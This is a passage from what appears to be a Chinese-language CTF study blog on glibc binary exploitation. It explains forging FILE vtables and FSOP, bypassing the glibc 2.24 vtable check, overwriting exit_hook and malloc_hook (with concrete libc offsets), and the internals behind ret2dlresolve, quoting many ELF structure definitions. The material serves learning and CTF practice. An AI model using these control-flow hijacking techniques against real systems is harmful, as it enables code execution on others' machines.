__seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>tips:</p><ul><li><p>在<code>_IO_file_init</code> 函数的初始化操作中，会调用<code>_IO_link_in</code> 把新分配的 FILE 链入<code>_IO_list_all</code> 为起始的 FILE 链表中</p></li><li><p>‘<strong>overflow</strong>‘ hook flushes the buffer.  (<a href="https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_M/WJUMP3">functions in vtable</a>) </p></li></ul><h3 id="伪造vtable"><a href="#伪造vtable" class="headerlink" title="伪造vtable"></a>伪造vtable</h3><p>首先分配一块内存来存放伪造的 vtable，之后修改<code>_IO_FILE_plus</code> 的 vtable 指针指向这块内存. 因为 vtable 中函数调用时会把对应的<code>_IO_FILE_plus</code> 指针作为第一个参数传递，因此这里我们把 “sh” 写入<code>_IO_FILE_plus</code> 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP 的核心思想就是劫持<code>_IO_list_all</code> 的值来伪造链表和其中的<code>_IO_FILE</code> 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable </code>中的<code>_IO_overflow</code>。</p><blockquote><p><em>fflush</em>() forces a <strong>write</strong> of all user-space buffered data for the given output or update stream</p></blockquote><p>a good <a href="https://gsec.hitb.org/materials/sg2018/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">material</a> in a conference</p><h3 id="glibc-gt-2-24"><a href="#glibc-gt-2-24" class="headerlink" title="glibc&gt;2.24"></a>glibc&gt;2.24</h3><p>2.24加入了对vtable劫持的检查.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br></code></pre></div></td></tr></table></figure><p>两个extern variable定义了vtable的地址范围, 在<code>IO_validate_vtable</code>中计算vtable的地址是否落在这个范围之内. 经过gdb(源码查不到), 这两个像是asm里面的标签一样, 不是一个变量估计没法修改, 除非能在libc中的data段进行修改, 不然无法劫持. </p><p>新的方法有两种:</p><ul><li>修改<code>_IO_buf_base</code>到指定的位置就可以任意地址写.</li><li><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。<br>剩下流程详见<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/exploit-in-libc2.24/#_io_str_jumps-overflow">这里</a>. 最好先看完heap的所有应用. </li></ul><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><h3 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h3><p><code>exit()</code>调用关系图:</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">void <span class="hljs-keyword">exit</span>()<br>    __run_exit_handlers()<br>        (some functions <span class="hljs-keyword">in</span> list)<br>        ...<br>        _dl_fini<br>            __rtld_lock_lock_recursive<br>            __rtld_lock_unlock_recursive<br>        ...<br></code></pre></div></td></tr></table></figure><h4 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体:"></a>相关结构体:</h4><p><code>struct rtld_global</code> (rt means RunTime): </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Internal functions of the run-time dynamic linker.</span><br><span class="hljs-comment">These can be accessed if you link again the dynamic linker</span><br><span class="hljs-comment">as a shared library, as in `-lld&#x27; or `/lib/ld.so&#x27; explicitly;</span><br><span class="hljs-comment">but are not normally of interest to user programs.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">The `-ldl&#x27; library functions in &lt;dlfcn.h&gt; provide a simple</span><br><span class="hljs-comment">user interface to run-time dynamic linking.  */</span><br></code></pre></div></td></tr></table></figure><p>exit_function and exit_function_list, 在handler中遍历list来执行每一个exit_function: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span><br><span class="hljs-comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> flavor;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">      &#123;</span><br>    <span class="hljs-keyword">void</span> (*at) (<span class="hljs-keyword">void</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-keyword">void</span> (*fn) (<span class="hljs-keyword">int</span> status, <span class="hljs-keyword">void</span> *arg);<br>        <span class="hljs-keyword">void</span> *arg;<br>      &#125; on;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">      &#123;</span><br>        <span class="hljs-keyword">void</span> (*fn) (<span class="hljs-keyword">void</span> *arg, <span class="hljs-keyword">int</span> status);<br>        <span class="hljs-keyword">void</span> *arg;<br>        <span class="hljs-keyword">void</span> *dso_handle;<br>      &#125; cxa;<br>      &#125; func;<br>  &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function_list</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function_list</span> *<span class="hljs-title">next</span>;</span><br>    <span class="hljs-keyword">size_t</span> idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exit_function</span> <span class="hljs-title">fns</span>[32];</span><br>  &#125;;<br></code></pre></div></td></tr></table></figure><p><code>__rtld_lock_lock_recursive</code> and <code>__rtld_lock_unlock_recursive</code> 这两个函数都在<a href="https://elixir.bootlin.com/glibc/latest/source/sysdeps/generic/ldsodefs.h#L301"><code>_rt_global</code></a>结构体里面, 可用gdb在运行时确定和libc_base的offset. 只要覆盖了就可以改变执行流, 比如改成one-gadgets, 相当于exit函数的hook(<strong>勉强算是</strong>).</p><p>所以这个利用也很明显, 拿到libc base address之后修改函数指针即可(要有任意地址写的能力).</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># libc-2.23.so</span><br>exit_hook = libc_base + <span class="hljs-number">0x5f0040</span> + <span class="hljs-number">3848</span><br>exit_hook = libc_base + <span class="hljs-number">0x5f0040</span> + <span class="hljs-number">3856</span><br><br><span class="hljs-comment"># libc-2.27.so</span><br>exit_hook = libc_base + <span class="hljs-number">0x619060</span> + <span class="hljs-number">3840</span><br>exit_hook = libc_base + <span class="hljs-number">0x619060</span> + <span class="hljs-number">3848</span><br></code></pre></div></td></tr></table></figure><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><p>和free_hook一个东西, 一般都是在获取任意写的能力之后覆盖掉这个地址, 然后在进行malloc/free达到执行任意地址处的代码的目的. </p><h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><h3 id="相关背景知识"><a href="#相关背景知识" class="headerlink" title="相关背景知识"></a>相关背景知识</h3><p><strong>Lazy bind</strong>: 第一次调用read</p><ul><li>先call read@plt. </li><li>第一条指令就是jmp GOT[], 再jmp到got里的地址</li><li>实际上存的是read@plt+6, 相当于继续执行下一条指令</li><li>push一个参数，也就是rel_offset</li><li>之后跳转到pre_resolve, 在plt[0]中, 总共两条指令. </li><li>又push一个参数(link_map).  </li><li>跳转到_dl_runtime_resolve</li></ul><hr><h4 id="相关类型大小"><a href="#相关类型大小" class="headerlink" title="相关类型大小"></a>相关类型大小</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Type for a 16-bit quantity.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf32_Half;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf64_Half;<br><span class="hljs-comment">/* Types for signed and unsigned 32-bit quantities.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf32_Word;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int32_t</span>  Elf32_Sword;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf64_Word;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int32_t</span>  Elf64_Sword;<br><span class="hljs-comment">/* Types for signed and unsigned 64-bit quantities.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf32_Xword;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int64_t</span>  Elf32_Sxword;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Xword;<br><span class="hljs-keyword">typedef</span><span class="hljs-keyword">int64_t</span>  Elf64_Sxword;<br><span class="hljs-comment">/* Type of addresses.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf32_Addr;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Addr;<br><span class="hljs-comment">/* Type of file offsets.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint32_t</span> Elf32_Off;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint64_t</span> Elf64_Off;<br><span class="hljs-comment">/* Type for section indices, which are 16-bit quantities.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf32_Section;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">uint16_t</span> Elf64_Section;<br><span class="hljs-comment">/* Type for version symbol information.  */</span><br><span class="hljs-keyword">typedef</span> Elf32_Half Elf32_Versym;<br><span class="hljs-keyword">typedef</span> Elf64_Half Elf64_Versym;<br></code></pre></div></td></tr></table></figure><p><strong>ELF</strong>: 原版来自:<a href="https://github.com/ReAbout/pwn-exercise-iot/blob/main/linux_x86_stack_overflow/pwn5_ret2dlresolve/pwn5.md">link</a> </p><h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a><code>.dynamic</code></h4><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向.<code>dynstr</code>, <code>.dynsym</code>, .<code>rel.plt</code>这3个section的指针。 <code>readelf -S</code> (Section Headers)</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    Elf32_Sword d_tag;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        Elf32_Word d_val;<br>        Elf32_Addr d_ptr;<br>    &#125; d_un;<br>&#125; Elf32_Dyn; <span class="hljs-comment">//0x8 bytes</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Elf64_Dyn</span> &#123;</span><br>    Elf64_Sxword d_tag; <span class="hljs-comment">// Type of dynamic table entry.</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        Elf64_Xword d_val; <span class="hljs-comment">// Integer value of entry.</span><br>        Elf64_Addr d_ptr;  <span class="hljs-comment">// Pointer value of entry.</span><br>    &#125; d_un;<br>&#125;; <span class="hljs-comment">//0x10 bytes</span><br><br><br>Dynamic section at offset <span class="hljs-number">0x21b0</span> contains <span class="hljs-number">24</span> entries:<br>  Tag        Type                         Name/Value<br> ...<br> <span class="hljs-number">0x00000005</span> (STRTAB)                     <span class="hljs-number">0x804828c</span>  <br> <span class="hljs-number">0x00000006</span> (SYMTAB)                     <span class="hljs-number">0x80481ec</span>   即为 `.dynsym`<br> ...<br> <span class="hljs-number">0x00000017</span> (JMPREL)                     <span class="hljs-number">0x8048344</span>   即为 `.rel.plt`<br> ...<br></code></pre></div></td></tr></table></figure><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p>一个字符串表，<strong>index为0的地方永远是0</strong>，然后后面是动态链接所需的字符串，0结尾，包括导入函数名。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移。</p><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p>是一个符号表（结构体数组），<strong>表示动态链接这些模块之间的符号导入导出关系</strong>。我们这里只关心函数符号。结构体定义如下, 总共0x10字节, Half是两字节, 而Elf64_Sym结构体的大小为0x18字节. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Word    st_name; <span class="hljs-comment">//符号名，是相对.dynstr起始的偏移</span><br>  Elf32_Addr    st_value;<br>  Elf32_Word    st_size;  <span class="hljs-comment">//如果是导入函数, 上面两个都是零, 因为是在别的文件中定义的. </span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_info; <span class="hljs-comment">//对于 导入 函数 符号而言，它是0x12</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_other; <span class="hljs-comment">//other字段都是0</span><br>  Elf32_Half st_shndx;    <span class="hljs-comment">//符号所在的段下标, 有ABS COMMON UNDEF三个特殊值. </span><br>&#125;Elf32_Sym;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Word        st_name;                <span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>     st_info;                <span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>     st_other;                <span class="hljs-comment">/* Symbol visibility */</span><br>  Elf64_Section     st_shndx;                <span class="hljs-comment">/* Section index */</span><br>  Elf64_Addr        st_value;                <span class="hljs-comment">/* Symbol value */</span><br>  Elf64_Xword       st_size;                <span class="hljs-comment">/* Symbol size */</span><br>&#125; Elf64_Sym;<br></code></pre></div></td></tr></table></figure><h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a><code>.rel.plt</code></h4><p>是重定位表，也是一个结构体数组，每个项对应一个导入函数。<strong>在64位下的段名称为<code>.rela.plt</code></strong>. </p><p><strong>除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf32_Addr r_offset; <span class="hljs-comment">// 对于可重定位文件, 该重定位入口所要修正的位置的第一个字节,</span><br>                         <span class="hljs-comment">// 对于可执行文件，此值为虚拟地址</span><br>    Elf32_Word r_info;   <span class="hljs-comment">// 在`.symtab`或者`.dyntab`中索引 | 类型</span><br>                         <span class="hljs-comment">// TYPE一般CPU相关, 例如R_386_PC32(静态), R_386_JUMP_SLOT(dyn)</span><br>&#125; Elf32_Rel;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_SYM(info) ((info) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_TYPE(info) ((unsigned char)(info))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF32_R_INFO(sym, type) (((sym) &lt;&lt; 8) + (unsigned char)(type))</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    Elf64_Addr r_offset;   <span class="hljs-comment">/* Address */</span><br>    Elf64_Xword r_info;    <span class="hljs-comment">/* Relocation type and symbol index */</span><br>    Elf64_Sxword r_addend; <span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<span class="hljs-comment">// 24 or 0x18 字节</span><br><span class="hljs-comment">/* How to extract and insert information held in the r_info field.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_TYPE(i) ((i)&amp;0xffffffff)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_INFO(sym, type) ((((Elf64_Xword)(sym)) &lt;&lt; 32) + (type))</span><br></code></pre></div></td></tr></table></figure><h4 id="linkmap"><a href="#linkmap" class="headerlink" title="linkmap:"></a><a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map">linkmap</a>:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//其中l_info:</span><br>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM<br>                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br></code></pre></div></td></tr></table></figure><p>而<a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#846">DT_NUM</a>是elf.h中定义的.dynamic段表项类型数目, 值为35, 前35个宏也是l_info中的下标, 可以索引到dynamic段中所有的信息.  在64位机上, l_info在linkmap中的偏移为0x40. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Legal values for d_tag (dynamic entry type).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_NULL        0        <span class="hljs-comment">/* Marks end of dynamic section */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_NEEDED    1        <span class="hljs-comment">/* Name of needed library */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PLTRELSZ    2        <span class="hljs-comment">/* Size in bytes of PLT relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PLTGOT    3        <span class="hljs-comment">/* Processor defined value */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_HASH        4        <span class="hljs-comment">/* Address of symbol hash table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_STRTAB    5        <span class="hljs-comment">/* Address of string table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMTAB    6        <span class="hljs-comment">/* Address of symbol table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELA        7        <span class="hljs-comment">/* Address of Rela relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELASZ    8        <span class="hljs-comment">/* Total size of Rela relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELAENT    9        <span class="hljs-comment">/* Size of one Rela reloc */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_STRSZ    10        <span class="hljs-comment">/* Size of string table */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMENT    11        <span class="hljs-comment">/* Size of one symbol table entry */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_INIT        12        <span class="hljs-comment">/* Address of init function */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_FINI        13        <span class="hljs-comment">/* Address of termination function */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SONAME    14        <span class="hljs-comment">/* Name of shared object */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RPATH    15        <span class="hljs-comment">/* Library search path (deprecated) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMBOLIC    16        <span class="hljs-comment">/* Start symbol search here */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_REL        17        <span class="hljs-comment">/* Address of Rel relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELSZ    18        <span class="hljs-comment">/* Total size of Rel relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RELENT    19        <span class="hljs-comment">/* Size of one Rel reloc */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PLTREL    20        <span class="hljs-comment">/* Type of reloc in PLT */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_DEBUG    21        <span class="hljs-comment">/* For debugging; unspecified */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_TEXTREL    22        <span class="hljs-comment">/* Reloc might modify .text */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_JMPREL    23        <span class="hljs-comment">/* Address of PLT relocs */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_BIND_NOW    24        <span class="hljs-comment">/* Process relocations of object */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_INIT_ARRAY    25        <span class="hljs-comment">/* Array with addresses of init fct */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_FINI_ARRAY    26        <span class="hljs-comment">/* Array with addresses of fini fct */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_INIT_ARRAYSZ    27        <span class="hljs-comment">/* Size in bytes of DT_INIT_ARRAY */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_FINI_ARRAYSZ    28        <span class="hljs-comment">/* Size in bytes of DT_FINI_ARRAY */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_RUNPATH    29        <span class="hljs-comment">/* Library search path */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_FLAGS    30        <span class="hljs-comment">/* Flags for the object being loaded */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_ENCODING    32        <span class="hljs-comment">/* Start of encoded range */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PREINIT_ARRAY 32        <span class="hljs-comment">/* Array with addresses of preinit fct*/</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_PREINIT_ARRAYSZ 33        <span class="hljs-comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DT_SYMTAB_SHNDX    34        <span class="hljs-comment">/* Address of SYMTAB_SHNDX section */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>    DT_NUM        35        <span class="hljs-comment">/* Number used */</span></span><br></code></pre></div></td></tr></table></figure><hr><h4 id="总结-runtime-resolve"><a href="#总结-runtime-resolve" class="headerlink" title="总结+runtime_resolve"></a>总结+runtime_resolve</h4><p>简单说来, 所有的符号会出现在<code>.symtab</code>段中, 需要动态链接的符号会出现在<code>.dynsym</code>中, 加上<code>.dynstr</code>, 记录的是所有导入符号的名称(除此之外也没啥有用信息了), <code>.rel.plt/.rel.dyn</code>有进行重定位时需要的位置+类型信息. 需要重定位时在其中遍历即可. </p><p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。<br>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 .dynamic 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p><p><code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 执行流程: (一篇分析<a href="https://www.twblogs.net/a/5e50f236bd9eee21167ec0d0/?lang=zh-cn">博客</a> | <a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map">linkmap</a> | <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#59">dl_fixup</a> | <a 